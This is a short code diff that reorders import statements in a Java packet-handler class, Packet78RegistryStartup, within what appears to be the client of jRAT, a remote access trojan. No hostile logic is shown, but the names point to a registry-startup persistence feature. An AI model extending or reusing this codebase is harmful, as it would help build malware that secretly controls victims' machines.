@@ -2,10 +2,10 @@ package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.Packet53RegistryStartup;
+import oslib.OperatingSystem;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-
-import oslib.OperatingSystem;
 
 
 public class Packet78RegistryStartup extends AbstractIncomingPacket {
